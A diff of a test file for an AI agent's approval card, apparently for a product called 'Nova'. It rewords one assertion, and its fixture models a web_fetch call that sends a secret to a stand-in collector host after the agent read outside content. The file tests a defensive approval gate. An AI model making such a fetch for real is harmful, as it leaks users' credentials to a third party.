@@ -72,7 +72,7 @@ test('the approval card says why the gate asked: what it would carry, and the ou
     }],
   };
   const html = renderTurn(turn, { live: { phase: 'approval', approval: 'x1' }, isLast: true });
-  assert.match(html, /It comes after reading <code>www\.example\.org<\/code>\. After reading something from outside, Nova always asks first\./);
+  assert.match(html, /It comes after reading <code>www\.example\.org<\/code>\. After reading something from outside, Nova asks first for this\./);
   const leak = { ...turn, items: [{ ...turn.items[0], name: 'web_fetch', args: { url: 'https://collector.example.net/?d=x' }, guard: { matched: [{ kind: 'secret', words: 'looks like a saved password or key' }], sources: ['www.example.org'] } }] };
   assert.match(renderTurn(leak, { live: { phase: 'approval', approval: 'x1' }, isLast: true }), /What it would send looks like a saved password or key\./);
 });
